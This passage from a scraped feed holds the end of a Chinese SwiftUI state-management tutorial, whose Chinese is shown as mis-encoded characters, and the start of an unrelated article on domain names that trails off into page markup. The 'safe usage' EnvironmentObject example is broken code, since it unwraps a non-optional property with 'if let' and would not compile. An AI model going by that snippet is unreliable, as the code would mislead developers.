<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-comment">// è‡ªåŠ¨å‘å¸ƒå˜åŒ–</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"Alice"</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> score <span class="hljs-operator">=</span> <span class="hljs-number">100</span>
    
    <span class="hljs-comment">// æ‰‹åŠ¨æ§åˆ¶å‘å¸ƒ</span>
    <span class="hljs-keyword">var</span> manualProperty <span class="hljs-operator">=</span> <span class="hljs-string">"Test"</span> {
        <span class="hljs-keyword">willSet</span> {
            objectWillChange.send()  <span class="hljs-comment">// æ‰‹åŠ¨è§¦å‘æ›´æ–°</span>
        }
    }
    
    <span class="hljs-comment">// è®¡ç®—å±æ€§éœ€è¦æ‰‹åŠ¨è§¦å‘</span>
    <span class="hljs-keyword">var</span> displayName: <span class="hljs-type">String</span> {
        <span class="hljs-string">"User: <span class="hljs-subst">\(name)</span>"</span>
        <span class="hljs-comment">// æ³¨æ„ï¼šè®¡ç®—å±æ€§å˜åŒ–ä¸ä¼šè‡ªåŠ¨è§¦å‘ï¼Œé™¤éä¾èµ–çš„ @Published å±æ€§å˜åŒ–</span>
    }
}
</code></pre>
<h3 data-id="heading-18">8. <strong>çŠ¶æ€ç®¡ç†çš„æœ€ä½³å®è·µ</strong></h3>
<h4 data-id="heading-19">1. <strong>é€‰æ‹©åˆé€‚çš„å·¥å…·</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å†³ç­–æ ‘ï¼š</span>
<span class="hljs-comment">// 1. æ˜¯å¦åªåœ¨å½“å‰è§†å›¾ä½¿ç”¨ï¼Ÿ â†’ @State</span>
<span class="hljs-comment">// 2. æ˜¯å¦éœ€è¦åœ¨å­è§†å›¾ä¸­ä¿®æ”¹ï¼Ÿ â†’ @Binding</span>
<span class="hljs-comment">// 3. æ˜¯å¦åœ¨å¤šä¸ªè§†å›¾å…±äº«ï¼Ÿ â†’ ObservableObject</span>
<span class="hljs-comment">// 4. æ˜¯å¦å…¨å±€å…±äº«ï¼Ÿ â†’ @EnvironmentObject</span>
<span class="hljs-comment">// 5. æ˜¯å¦è®¿é—®ç³»ç»Ÿè®¾ç½®ï¼Ÿ â†’ @Environment</span>
</code></pre>
<h4 data-id="heading-20">2. <strong>é¿å…åœ¨ body ä¸­åˆ›å»ºçŠ¶æ€</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ¯æ¬¡éƒ½ä¼šåˆ›å»ºæ–°å®ä¾‹</span>
<span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
    <span class="hljs-keyword">let</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()  <span class="hljs-comment">// é”™è¯¯ï¼</span>
    <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ @StateObject</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">ViewModel</span>()  <span class="hljs-comment">// åªåˆ›å»ºä¸€æ¬¡</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<h4 data-id="heading-21">3. <strong>çŠ¶æ€æå‡ï¼ˆState Hoistingï¼‰</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// å°†çŠ¶æ€æå‡åˆ°æœ€è¿‘çš„å…±åŒç¥–å…ˆ</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ParentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> text <span class="hljs-operator">=</span> <span class="hljs-string">""</span>  <span class="hljs-comment">// çŠ¶æ€æå‡</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">ChildAView</span>(text: <span class="hljs-variable">$text</span>)
            <span class="hljs-type">ChildBView</span>(text: <span class="hljs-variable">$text</span>)
        }
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildAView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> text: <span class="hljs-type">String</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">TextField</span>(<span class="hljs-string">"Enter text"</span>, text: <span class="hljs-variable">$text</span>)
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildBView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> text: <span class="hljs-type">String</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(<span class="hljs-string">"You typed: <span class="hljs-subst">\(text)</span>"</span>)
    }
}
</code></pre>
<h4 data-id="heading-22">4. <strong>ä½¿ç”¨ ViewModel ç®¡ç†å¤æ‚çŠ¶æ€</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> username <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> password <span class="hljs-operator">=</span> <span class="hljs-string">""</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> errorMessage: <span class="hljs-type">String</span>?
    
    <span class="hljs-keyword">var</span> isFormValid: <span class="hljs-type">Bool</span> {
        <span class="hljs-operator">!</span>username.isEmpty <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-operator">!</span>password.isEmpty
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">login</span>() <span class="hljs-keyword">async</span> {
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
        errorMessage <span class="hljs-operator">=</span> <span class="hljs-literal">nil</span>
        
        <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
        <span class="hljs-keyword">do</span> {
            <span class="hljs-keyword">try</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(nanoseconds: <span class="hljs-number">1_000_000_000</span>)
            <span class="hljs-comment">// å¤„ç†ç™»å½•é€»è¾‘</span>
        } <span class="hljs-keyword">catch</span> {
            errorMessage <span class="hljs-operator">=</span> <span class="hljs-string">"Login failed"</span>
        }
        
        isLoading <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    }
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">LoginView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">LoginViewModel</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Form</span> {
            <span class="hljs-type">TextField</span>(<span class="hljs-string">"Username"</span>, text: <span class="hljs-variable">$viewModel</span>.username)
            <span class="hljs-type">SecureField</span>(<span class="hljs-string">"Password"</span>, text: <span class="hljs-variable">$viewModel</span>.password)
            
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> error <span class="hljs-operator">=</span> viewModel.errorMessage {
                <span class="hljs-type">Text</span>(error).foregroundColor(.red)
            }
            
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Login"</span>) {
                <span class="hljs-type">Task</span> {
                    <span class="hljs-keyword">await</span> viewModel.login()
                }
            }
            .disabled(<span class="hljs-operator">!</span>viewModel.isFormValid <span class="hljs-operator">||</span> viewModel.isLoading)
        }
    }
}
</code></pre>
<h3 data-id="heading-23">9. <strong>çŠ¶æ€ç®¡ç†çš„æ€§èƒ½ä¼˜åŒ–</strong></h3>
<h4 data-id="heading-24">1. <strong>ä½¿ç”¨ Equatable é¿å…ä¸å¿…è¦çš„æ›´æ–°</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span>, <span class="hljs-title class_">Equatable</span> {
    <span class="hljs-keyword">let</span> user: <span class="hljs-type">User</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(user.name)
            .background(<span class="hljs-type">Color</span>.random())
    }
    
    <span class="hljs-comment">// å®ç° Equatableï¼Œåªæœ‰ user.id å˜åŒ–æ—¶æ‰æ›´æ–°</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">==</span> (<span class="hljs-params">lhs</span>: <span class="hljs-type">UserView</span>, <span class="hljs-params">rhs</span>: <span class="hljs-type">UserView</span>) -&gt; <span class="hljs-type">Bool</span> {
        lhs.user.id <span class="hljs-operator">==</span> rhs.user.id
    }
}

<span class="hljs-comment">// åœ¨çˆ¶è§†å›¾ä¸­ä½¿ç”¨</span>
<span class="hljs-type">List</span>(users) { user <span class="hljs-keyword">in</span>
    <span class="hljs-type">UserView</span>(user: user)
        .equatable()  <span class="hljs-comment">// å¯ç”¨è‡ªå®šä¹‰ç›¸ç­‰æ€§æ£€æŸ¥</span>
}
</code></pre>
<h4 data-id="heading-25">2. <strong>ä½¿ç”¨ .id() ä¿®é¥°ç¬¦å¼ºåˆ¶æ›´æ–°</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">DynamicView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> version <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-comment">// å½“ version å˜åŒ–æ—¶ï¼Œæ•´ä¸ªè§†å›¾ä¼šé‡æ–°åˆ›å»º</span>
            <span class="hljs-type">ComplexView</span>()
                .id(version)
            
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Refresh"</span>) {
                version <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>  <span class="hljs-comment">// å¼ºåˆ¶é‡æ–°åˆ›å»º</span>
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-26">3. <strong>é¿å…åœ¨ body ä¸­åˆ›å»ºé—­åŒ…</strong></h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šæ¯æ¬¡éƒ½ä¼šåˆ›å»ºæ–°é—­åŒ…</span>
<span class="hljs-type">Button</span>(action: {
    <span class="hljs-keyword">self</span>.doSomething()  <span class="hljs-comment">// æ¯æ¬¡ body è®¡ç®—éƒ½åˆ›å»ºæ–°é—­åŒ…</span>
}) {
    <span class="hljs-type">Text</span>(<span class="hljs-string">"Click me"</span>)
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ç§æœ‰æ–¹æ³•</span>
<span class="hljs-type">Button</span>(action: doSomething) {
    <span class="hljs-type">Text</span>(<span class="hljs-string">"Click me"</span>)
}

<span class="hljs-keyword">private</span> <span class="hljs-keyword">func</span> <span class="hljs-title function_">doSomething</span>() {
    <span class="hljs-comment">// å¤„ç†é€»è¾‘</span>
}
</code></pre>
<h3 data-id="heading-27">10. <strong>çŠ¶æ€ç®¡ç†çš„å¸¸è§é™·é˜±</strong></h3>
<h4 data-id="heading-28">é™·é˜±1ï¼šåœ¨å­è§†å›¾ä¸­ä¿®æ”¹ @State</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šä¸èƒ½ç›´æ¥åœ¨å­è§†å›¾ä¸­ä¿®æ”¹çˆ¶è§†å›¾çš„ @State</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-keyword">var</span> count: <span class="hljs-type">Int</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Increment"</span>) {
            <span class="hljs-comment">// é”™è¯¯ï¼ä¸èƒ½ä¿®æ”¹</span>
        }
    }
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ @Binding</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ChildView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> count: <span class="hljs-type">Int</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Increment"</span>) {
            count <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>  <span class="hljs-comment">// æ­£ç¡®ï¼</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-29">é™·é˜±2ï¼š@State ä¸å¼•ç”¨ç±»å‹</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
    <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"John"</span>
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> user <span class="hljs-operator">=</span> <span class="hljs-type">User</span>()  <span class="hljs-comment">// ä¸æ¨èï¼</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Change Name"</span>) {
            user.name <span class="hljs-operator">=</span> <span class="hljs-string">"Alice"</span>  <span class="hljs-comment">// âŒ ä¸ä¼šè§¦å‘è§†å›¾æ›´æ–°ï¼</span>
        }
    }
}

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨ @StateObject æˆ– @ObservedObject</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserViewModel</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> name <span class="hljs-operator">=</span> <span class="hljs-string">"John"</span>
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">UserView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@StateObject</span> <span class="hljs-keyword">var</span> viewModel <span class="hljs-operator">=</span> <span class="hljs-type">UserViewModel</span>()
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(<span class="hljs-string">"Change Name"</span>) {
            viewModel.name <span class="hljs-operator">=</span> <span class="hljs-string">"Alice"</span>  <span class="hljs-comment">// âœ… ä¼šè§¦å‘æ›´æ–°</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-30">é™·é˜±3ï¼š@EnvironmentObject æœªæä¾›</h4>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@EnvironmentObject</span> <span class="hljs-keyword">var</span> settings: <span class="hljs-type">AppSettings</span>  <span class="hljs-comment">// è¿è¡Œæ—¶å´©æºƒå¦‚æœæœªæä¾›ï¼</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Text</span>(settings.theme)
    }
}

<span class="hljs-comment">// âœ… å®‰å…¨ä½¿ç”¨</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@EnvironmentObject</span> <span class="hljs-keyword">var</span> settings: <span class="hljs-type">AppSettings</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> settings <span class="hljs-operator">=</span> settings {  <span class="hljs-comment">// å®é™…ä¸Š @EnvironmentObject æ˜¯ non-optional</span>
            <span class="hljs-type">Text</span>(settings.theme)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Settings not available"</span>)
        }
    }
}
</code></pre>
<h3 data-id="heading-31">11. <strong>çŠ¶æ€ç®¡ç†ä¸ Combine é›†æˆ</strong></h3>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">import</span> Combine

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataService</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> data: [<span class="hljs-type">String</span>] <span class="hljs-operator">=</span> []
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> cancellables <span class="hljs-operator">=</span> <span class="hljs-type">Set</span>&lt;<span class="hljs-type">AnyCancellable</span>&gt;()
    
    <span class="hljs-keyword">init</span>() {
        <span class="hljs-comment">// ä½¿ç”¨ Combine å¤„ç†å¤æ‚æ•°æ®æµ</span>
        <span class="hljs-variable">$data</span>
            .debounce(for: .milliseconds(<span class="hljs-number">300</span>), scheduler: <span class="hljs-type">RunLoop</span>.main)
            .sink { newData <span class="hljs-keyword">in</span>
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"Data updated: <span class="hljs-subst">\(newData)</span>"</span>)
            }
            .store(in: <span class="hljs-operator">&amp;</span>cancellables)
    }
    
    <span class="hljs-keyword">func</span> <span class="hljs-title function_">fetchData</span>() {
        <span class="hljs-comment">// æ¨¡æ‹Ÿç½‘ç»œè¯·æ±‚</span>
        <span class="hljs-type">URLSession</span>.shared.dataTaskPublisher(for: <span class="hljs-type">URL</span>(string: <span class="hljs-string">"https://api.example.com"</span>)<span class="hljs-operator">!</span>)
            .map(\.data)
            .decode(type: [<span class="hljs-type">String</span>].<span class="hljs-keyword">self</span>, decoder: <span class="hljs-type">JSONDecoder</span>())
            .receive(on: <span class="hljs-type">DispatchQueue</span>.main)
            .sink(receiveCompletion: { <span class="hljs-keyword">_</span> <span class="hljs-keyword">in</span> },
                  receiveValue: { [<span class="hljs-keyword">weak</span> <span class="hljs-keyword">self</span>] newData <span class="hljs-keyword">in</span>
                <span class="hljs-keyword">self</span><span class="hljs-operator">?</span>.data <span class="hljs-operator">=</span> newData
            })
            .store(in: <span class="hljs-operator">&amp;</span>cancellables)
    }
}
</code></pre>
<h3 data-id="heading-32">12. <strong>æ€»ç»“ï¼šçŠ¶æ€ç®¡ç†é€‰æ‹©æŒ‡å—</strong></h3>


















































<table><thead><tr><th>åœºæ™¯</th><th>æ¨èæ–¹æ¡ˆ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>ç®€å•è§†å›¾å†…éƒ¨çŠ¶æ€</strong></td><td><code>@State</code></td><td>è®¡æ•°å™¨ã€å¼€å…³çŠ¶æ€ç­‰</td></tr><tr><td><strong>çˆ¶å­è§†å›¾åŒå‘ç»‘å®š</strong></td><td><code>@Binding</code></td><td>è¡¨å•è¾“å…¥ã€è®¾ç½®ä¼ é€’</td></tr><tr><td><strong>è§†å›¾è‡ªå·±çš„ ViewModel</strong></td><td><code>@StateObject</code></td><td>åˆ›å»ºå¹¶æ‹¥æœ‰ ViewModel</td></tr><tr><td><strong>æ¥æ”¶å¤–éƒ¨ ViewModel</strong></td><td><code>@ObservedObject</code></td><td>çˆ¶è§†å›¾ä¼ é€’çš„ ViewModel</td></tr><tr><td><strong>è·¨å¤šçº§è§†å›¾å…±äº«</strong></td><td><code>@EnvironmentObject</code></td><td>ä¸»é¢˜ã€ç”¨æˆ·è®¾ç½®ç­‰</td></tr><tr><td><strong>è®¿é—®ç³»ç»Ÿè®¾ç½®</strong></td><td><code>@Environment</code></td><td>æ·±è‰²æ¨¡å¼ã€åŒºåŸŸè®¾ç½®</td></tr><tr><td><strong>ç”¨æˆ·é»˜è®¤è®¾ç½®</strong></td><td><code>@AppStorage</code></td><td>æŒä¹…åŒ–ç®€å•è®¾ç½®</td></tr><tr><td><strong>åœºæ™¯çŠ¶æ€æ¢å¤</strong></td><td><code>@SceneStorage</code></td><td>å¤šçª—å£åº”ç”¨çŠ¶æ€æ¢å¤</td></tr></tbody></table>
<p>è®°ä½å…³é”®åŸåˆ™ï¼š<strong>çŠ¶æ€åº”è¯¥å­˜å‚¨åœ¨èƒ½è¦†ç›–æ‰€æœ‰éœ€è¦è®¿é—®è¯¥çŠ¶æ€çš„è§†å›¾çš„æœ€é«˜å±‚çº§ä¸­ï¼Œä½†ä¸è¦æ›´é«˜</strong>ã€‚</p>
<p>è¿™ç§è®¾è®¡ä½¿å¾— SwiftUI åº”ç”¨æ—¢çµæ´»åˆé«˜æ•ˆï¼Œèƒ½å¤Ÿè‡ªåŠ¨ä¼˜åŒ–è§†å›¾æ›´æ–°ï¼Œæä¾›æµç•…çš„ç”¨æˆ·ä½“éªŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºä»€ä¹ˆç½‘ç«™éœ€è¦"åŸŸå"ï¼Ÿâ€”â€”ä» IP åœ°å€åˆ°ç½‘å€çš„æ¼”è¿›]]></title>    <link>https://juejin.cn/post/7583992239103672372</link>    <guid>https://juejin.cn/post/7583992239103672372</guid>    <pubDate>2025-12-16T06:58:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583992239103672372" data-draft-id="7583973472324124687" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºä»€ä¹ˆç½‘ç«™éœ€è¦&quot;åŸŸå&quot;ï¼Ÿâ€”â€”ä» IP åœ°å€åˆ°ç½‘å€çš„æ¼”è¿›"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-16T06:58:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ— é™å¤§6"/> <meta itemprop="url" content="https://juejin.cn/user/2865758605422890"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºä»€ä¹ˆç½‘ç«™éœ€è¦"åŸŸå"ï¼Ÿâ€”â€”ä» IP åœ°å€åˆ°ç½‘å€çš„æ¼”è¿›
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2865758605422890/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ— é™å¤§6
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T06:58:54.000Z" title="Tue Dec 16 2025 06:58:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA